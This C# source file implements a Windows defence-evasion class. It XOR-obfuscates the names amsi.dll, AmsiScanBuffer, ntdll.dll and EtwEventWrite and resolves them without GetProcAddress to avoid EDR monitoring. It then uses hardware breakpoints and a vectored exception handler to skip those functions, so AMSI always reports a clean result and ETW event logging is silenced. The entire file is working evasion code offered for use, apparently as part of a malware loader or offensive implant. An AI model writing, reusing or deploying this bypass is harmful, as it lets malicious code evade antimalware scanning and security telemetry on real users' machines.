using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Runtime.CompilerServices;

namespace VanguardCore
{
    public static unsafe class ReflectiveEvasion
    {
        private static void* _amsiAddr = null;
        private static void* _etwAddr = null;
        private static IntPtr _vehHandle = IntPtr.Zero;

        // XOR salt = 0x55
        private static readonly byte[] _amsiDllEnc = { 0x34, 0x38, 0x26, 0x3C, 0x7B, 0x31, 0x39, 0x39 }; 
        private static readonly byte[] _amsiFuncEnc = { 0x14, 0x38, 0x26, 0x3C, 0x16, 0x36, 0x34, 0x3B, 0x17, 0x20, 0x33, 0x33, 0x30, 0x27 }; 
        private static readonly byte[] _ntdllEnc = { 0x3B, 0x21, 0x31, 0x39, 0x39, 0x7B, 0x31, 0x39, 0x39 }; 
        private static readonly byte[] _etwFuncEnc = { 0x10, 0x21, 0x22, 0x10, 0x23, 0x30, 0x3B, 0x21, 0x12, 0x27, 0x3C, 0x21, 0x30 }; 

        private static string X(byte[] b) {
            byte[] d = new byte[b.Length];
            for (int i = 0; i < b.Length; i++) d[i] = (byte)(b[i] ^ 0x55);
            return Encoding.UTF8.GetString(d);
        }

        public static void Initialize()
        {
            try
            {
                // [PRO] Stealth API Resolution (PEB/EAT Walker)
                // No GetProcAddress calls to trigger EDR API-monitoring
                IntPtr hAmsi = SyscallManager.StealthGetModuleBase(X(_amsiDllEnc));
                if (hAmsi == IntPtr.Zero) hAmsi = LoadLibraryW(X(_amsiDllEnc));
                if (hAmsi != IntPtr.Zero)
                    _amsiAddr = (void*)SyscallManager.StealthGetProcAddress(hAmsi, X(_amsiFuncEnc));

                IntPtr hNtdll = SyscallManager.StealthGetModuleBase(X(_ntdllEnc));
                if (hNtdll != IntPtr.Zero)
                    _etwAddr = (void*)SyscallManager.StealthGetProcAddress(hNtdll, X(_etwFuncEnc));

                if (_amsiAddr == null && _etwAddr == null) return;

                _vehHandle = AddVectoredExceptionHandler(1, (delegate* unmanaged<EXCEPTION_POINTERS*, long>)&ExceptionHandler);
                ApplyHWBP();
            }
            catch { }
        }

        [UnmanagedCallersOnly]
        private static long ExceptionHandler(EXCEPTION_POINTERS* exceptions)
        {
            if (exceptions->ExceptionRecord->ExceptionCode == 0x80000004) // STATUS_SINGLE_STEP
            {
                void* rip = (void*)exceptions->ContextRecord->Rip;
                if (rip == _amsiAddr || rip == _etwAddr)
                {
                    ulong returnAddr = *(ulong*)exceptions->ContextRecord->Rsp;
                    exceptions->ContextRecord->Rip = returnAddr;
                    exceptions->ContextRecord->Rsp += 8;
                    exceptions->ContextRecord->Rax = 0;

                    if (rip == _amsiAddr)
                    {
                        ulong resultPtr = *(ulong*)(exceptions->ContextRecord->Rsp + 0x20);
                        if (resultPtr != 0) *(uint*)resultPtr = 0; // AMSI_RESULT_CLEAN
                    }
                    return -1; // EXCEPTION_CONTINUE_EXECUTION
                }
            }
            return 0; // EXCEPTION_CONTINUE_SEARCH
        }

        public static void ApplyHWBP()
        {
            if (_amsiAddr == null && _etwAddr == null) return;
            CONTEXT64 ctx = new CONTEXT64 { ContextFlags = 0x100010 }; // CONTEXT_DEBUG_REGISTERS
            
            IntPtr hThread = GetCurrentThread();
            if (GetThreadContext(hThread, ref ctx))
            {
                ctx.Dr0 = ctx.Dr1 = 0; ctx.Dr7 &= ~(ulong)0xFF;
                if (_amsiAddr != null) { ctx.Dr0 = (ulong)_amsiAddr; ctx.Dr7 |= (1 << 0); }
                if (_etwAddr != null) { ctx.Dr1 = (ulong)_etwAddr; ctx.Dr7 |= (1 << 2); }
                SetThreadContext(hThread, ref ctx);
            }
        }

        #region Native Imports
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)] private static extern IntPtr LoadLibraryW(string lpFileName);
        [DllImport("kernel32.dll")] private static extern IntPtr AddVectoredExceptionHandler(uint First, delegate* unmanaged<EXCEPTION_POINTERS*, long> Handler);
        [DllImport("kernel32.dll")] private static extern IntPtr GetCurrentThread();
        [DllImport("kernel32.dll")] private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);
        [DllImport("kernel32.dll")] private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        private struct CONTEXT64 {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags, MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15, Rip;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct EXCEPTION_RECORD { public uint ExceptionCode; public uint ExceptionFlags; public EXCEPTION_RECORD* ExceptionRecordPtr; public void* ExceptionAddress; public uint NumberParameters; }

        [StructLayout(LayoutKind.Sequential)]
        private struct EXCEPTION_POINTERS { public EXCEPTION_RECORD* ExceptionRecord; public CONTEXT64* ContextRecord; }
        #endregion
    }
}
